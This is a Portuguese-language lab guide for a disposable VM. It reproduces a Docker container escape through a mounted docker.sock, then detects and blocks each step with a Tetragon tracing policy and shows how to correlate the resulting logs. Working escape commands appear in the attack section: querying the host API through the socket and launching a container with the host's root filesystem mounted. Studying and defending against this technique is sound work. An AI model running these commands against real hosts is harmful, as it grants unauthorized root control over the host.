# Laboratório — Cenário 1: Escape via `docker.sock`

Guia completo e autocontido. Só para a VM do Proxmox (isolada e descartável). Nunca na VPS.

---

## 1. Escopo e cenário

### O que estamos simulando
Um contêiner mal configurado que tem o soquete de controle do Docker (`/var/run/docker.sock`) montado dentro dele. A partir desse contêiner, um atacante consegue sair para o host e virar root da máquina inteira. O objetivo do laboratório é **detectar** cada etapa desse ataque com o Tetragon e, no fim, **conter** a cadeia no primeiro elo.

### A vulnerabilidade
Quem tem acesso ao `docker.sock` controla o Docker do host. Com isso, pode pedir ao host que crie um contêiner novo com o disco da máquina montado, e então ler ou escrever em qualquer arquivo do host. É uma má prática comum em produção (ferramentas de CI/CD, Portainer, Watchtower montam esse soquete "por conveniência").

### Modelo do atacante (o que é realista e o que é atalho)
Assumimos que o atacante **já tem execução de comandos dentro do contêiner** `lab-sock` (por exemplo, após explorar uma aplicação web vulnerável — fase de Initial Access, fora do nosso escopo). A partir daí:

| Aspecto | No laboratório | Num ataque real |
|---|---|---|
| Usuário dentro do contêiner | root do contêiner (padrão) | pode ser não-root se o contêiner for endurecido |
| Ferramentas (`docker-cli`, `curl`) | instalamos com `apk add` por conveniência | o atacante traria binários prontos, ou usaria os já presentes; `apk add` falharia num contêiner read-only ou sem rede |
| Instalação em runtime | permitida | é por si só um comportamento anômalo e **detectável** |

Ou seja: o `apk add` **não é escalação de privilégio** (o root do contêiner já pode fazê-lo). A escalação real só acontece quando o atacante sai para o host (Etapa 4). Mesmo assim, instalar ferramentas em runtime é um sinal de preparação que vamos detectar como uma etapa própria.

### Cadeia de ataque (MITRE ATT&CK for Containers)

| # | Etapa | Técnica | Coluna |
|---|---|---|---|
| 1 | Instalar ferramentas no contêiner | T1105 – Ingress Tool Transfer | (preparação) |
| 2 | Reconhecer o soquete e listar contêineres | T1613 – Container and Resource Discovery | Discovery |
| 3 | Criar contêiner novo com o disco do host | T1610 – Deploy Container | Execution |
| 4 | Escrever no sistema de arquivos do host | T1611 – Escape to Host | Privilege Escalation |

> Confirme os IDs em attack.mitre.org/matrices/enterprise/containers (a MITRE reorganiza as colunas periodicamente).

### As duas camadas de defesa que o trabalho demonstra
- **Prevenção (configuração):** não montar o soquete, rodar o contêiner como não-root, filesystem read-only. Elimina o problema na origem.
- **Detecção e contenção (Tetragon):** quando a prevenção falha, observar o comportamento e bloquear. É o foco deste laboratório.

---

## 2. Pré-requisitos

- Tetragon rodando: `sudo docker ps --filter name=tetragon` → "Up".
- **Dois terminais SSH** na VM: **T1** (observação) e **T2** (ataque).

---

## 3. Preparação do ambiente

No **T2**:

```bash
# rede isolada para o alvo
sudo docker network create lab-net

# contêiner-alvo com o soquete do Docker montado (a vulnerabilidade)
sudo docker run -d --name lab-sock --label tetragon-lab=1 --network lab-net \
  -v /var/run/docker.sock:/var/run/docker.sock alpine:3.20 sleep infinity

# confirmar
sudo docker ps --filter name=lab-sock
```

---

## 4. Carregar a política de detecção (modo monitor)

Crie a política na VM:

```bash
sudo mkdir -p /etc/tetragon/teste
sudo tee /etc/tetragon/teste/acesso-docker-sock.yaml >/dev/null <<'EOF'
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "acesso-docker-sock"
spec:
  kprobes:
  - call: "security_file_open"
    syscall: false
    args:
    - index: 0
      type: "file"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Equal"
        values:
        - "/run/docker.sock"
      matchActions:
      - action: Post
EOF
```

Carregue sem reiniciar o agente:

```bash
sudo docker exec tetragon tetra tracingpolicy add /etc/tetragon/teste/acesso-docker-sock.yaml
sudo docker exec tetragon tetra --timeout 60s tracingpolicy list
```

- `action: Post` = só observa, não bloqueia. Trocamos para `Override` na fase de contenção.
- As Etapas 1 a 3 são captadas pelo `process_exec` nativo (não precisam de política). A política acima mira a Etapa 4 (abertura do soquete).

---

## 5. Abrir a observação (T1)

No **T1**:

```bash
ID=$(sudo docker inspect -f '{{.Id}}' lab-sock | cut -c1-12)
echo "ID do lab-sock: $ID"
sudo tail -f /var/log/tetragon/tetragon.log \
  | jq -c --arg id "$ID" 'select([.. | .docker? // empty] | any(startswith($id)))'
```

Deixe rodando. Tudo que vier do `lab-sock` aparece aqui.

---

## 6. Execução do ataque (T2)

Antes de cada etapa, registre um marco de tempo. Isso é o que separa as etapas depois (o log é cumulativo; não precisa copiar a cada passo).

### Etapa 1 — Ingress Tool Transfer (T1105)
```bash
echo "=== ETAPA 1 (T1105) - $(date -Is) ===" | sudo tee -a ~/marcos-cenario1.txt
sudo docker exec lab-sock sh -c 'apk add --no-cache docker-cli curl'
```
O atacante instala as ferramentas que vai usar. Comportamento anômalo: um contêiner em produção não instala pacotes em runtime. No T1 você vê `process_exec` de `apk`.

### Etapa 2 — Discovery (T1613)
```bash
echo "=== ETAPA 2 (T1613) - $(date -Is) ===" | sudo tee -a ~/marcos-cenario1.txt
sudo docker exec lab-sock sh -c 'ls -l /var/run/docker.sock'
sudo docker exec lab-sock sh -c 'curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | head -c 300; echo'
```
Confirma que o soquete existe e o usa para listar os contêineres do host. No T1: `process_exec` de `ls` e `curl`, e a abertura de `/run/docker.sock`.

### Etapa 3 — Deploy Container (T1610)
```bash
echo "=== ETAPA 3 (T1610) - $(date -Is) ===" | sudo tee -a ~/marcos-cenario1.txt
sudo docker exec lab-sock sh -c \
  'docker -H unix:///var/run/docker.sock run -d --name fuga -v /:/host alpine:3.20 sleep infinity'
```
Pelo soquete, pede ao Docker do host um contêiner novo (`fuga`) com o disco do host (`/`) montado em `/host`. No host: `process_exec` de `runc` e `containerd-shim`.

### Etapa 4 — Escape to Host (T1611)
```bash
echo "=== ETAPA 4 (T1611) - $(date -Is) ===" | sudo tee -a ~/marcos-cenario1.txt
sudo docker exec fuga sh -c 'echo "escape-$(date +%s)" > /host/tmp/PROVA_ESCAPE.txt'
cat /tmp/PROVA_ESCAPE.txt
```
De dentro do `fuga`, escreve em `/host/tmp`, que é o `/tmp` da VM. O `cat` na VM mostra o arquivo: prova do escape. Marcador inofensivo de propósito.

### Salvar a evidência (uma vez, no fim)
```bash
sudo cp /var/log/tetragon/tetragon.log ~/evidencia-cenario1-$(date +%H%M).json
```

---

## 7. Correlação

A correlação liga os eventos por três campos: `process.docker` (de qual contêiner veio), `process.exec_id`/`parent_exec_id` (cadeia de processos) e `time` (ordem e janela).

Linha do tempo legível:
```bash
cat ~/evidencia-cenario1-*.json \
  | jq -r 'select(.process_exec!=null)
      | "\(.time) docker=\(.process_exec.process.docker // "host") \(.process_exec.process.binary) \(.process_exec.process.arguments)"'
```
Cruzando com `~/marcos-cenario1.txt`, você deve ver a sequência: `apk` → `curl` no `lab-sock` → `runc` no host → escrita a partir do `fuga`, tudo numa janela curta. **Esse encadeamento é o padrão** que o Wazuh vai reconhecer na fase futura.

---

## 8. Contenção (modo enforce)

Limpe a rodada anterior:
```bash
sudo docker rm -f fuga
sudo rm -f /tmp/PROVA_ESCAPE.txt
```

Troque a ação de `Post` para `Override`:
```bash
sudo sed -i 's/action: Post/action: Override\n        argError: -1/' /etc/tetragon/teste/acesso-docker-sock.yaml
sudo docker exec tetragon tetra tracingpolicy delete acesso-docker-sock
sudo docker exec tetragon tetra tracingpolicy add /etc/tetragon/teste/acesso-docker-sock.yaml
```
`Override` com `argError: -1` faz a abertura do soquete retornar erro. O processo vive, mas não fala com o Docker.

Repita a Etapa 2:
```bash
sudo docker exec lab-sock sh -c 'curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json; echo "saida=$?"'
```
O `curl` deve falhar. Sem a Etapa 2, as etapas 3 e 4 não acontecem: a cadeia parou no primeiro elo.

> Se o `Override` não bloquear, o hook `security_file_open` não é o ponto certo para o soquete. É um resultado válido: passamos ao plano B (interceptar a conexão ao soquete unix, ou filtrar pelo `process.docker`). Me avise o que apareceu.

---

## 9. Limpeza

```bash
sudo docker exec tetragon tetra tracingpolicy delete acesso-docker-sock
sudo docker rm -f $(sudo docker ps -aq --filter label=tetragon-lab=1)
sudo docker rm -f fuga 2>/dev/null
sudo docker network rm lab-net
sudo rm -f /tmp/PROVA_ESCAPE.txt
```
Isso remove a política de teste, os alvos, a rede e o arquivo-prova. A configuração permanente do Tetragon não é afetada.

---

## 10. O que você deve concluir do experimento

- Um único erro de configuração (soquete montado) permite controle total do host.
- O ataque tem **etapas distintas e observáveis**, não um salto único.
- A **preparação** (instalar ferramentas) já é detectável, antes mesmo do escape.
- Bloquear o **elo mais fraco** (acesso ao soquete) quebra a cadeia inteira.
- Detecção e prevenção se complementam: o ideal é não montar o soquete **e** monitorar caso isso aconteça.
